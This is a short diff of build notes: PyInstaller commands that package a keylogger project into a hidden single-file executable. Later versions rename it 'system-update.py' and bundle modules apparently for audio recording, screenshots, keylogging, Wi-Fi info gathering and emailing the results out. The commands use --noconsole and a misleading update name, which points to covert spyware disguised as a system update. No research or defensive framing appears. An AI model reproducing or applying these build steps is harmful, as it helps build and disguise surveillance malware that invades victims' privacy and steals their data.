@@ -1,4 +1,13 @@
 pyinstaller --onefile --noconsole --add-data "encryption_key.bin;." --add-data "encryption.py;." --add-data "emailFunctionality.py;." keylogger.py
 
-pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." --add-data "system-update.spec;." --add-data "audio_rec.py;." --add-data "email_sender.py;." --add-data "keylogger.py;." --add-data "logger_setup.py;." --add-data "screenshot.py;." --add-data "wifi_info.py;." "system-update.py"
+pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." "system-update.py" 
 
+pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." --add-data "audio_rec.py;." "system-update.py" 
+
+pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." --add-data "email_sender.py;." --add-data "logger_setup.py;." "system-update.py" 
+
+pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." --add-data "audio_rec.py;." --add-data "email_sender.py;." --add-data "keylogger.py;." --add-data "logger_setup.py;." --add-data "screenshot.py;." --add-data "wifi_info.py;." "system-update.py"
+
+
+
+pyinstaller --onefile --noconsole --hidden-import PIL --hidden-import Pillow --add-data ".venv;." --add-data "get-pip.py;." --add-data "email_sender.py;." --add-data "logger_setup.py;." "system-update.py" 
